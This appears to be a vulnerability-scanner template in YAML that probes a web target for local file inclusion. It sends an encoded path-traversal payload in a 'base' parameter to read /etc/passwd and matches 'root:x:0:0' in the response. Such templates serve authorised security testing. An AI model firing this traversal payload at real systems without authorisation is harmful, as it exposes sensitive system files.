id: lfi6-0092
name: 'Traversal in base'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via base'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      base:
        - '..%2f..%2f..%2fetc%2fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
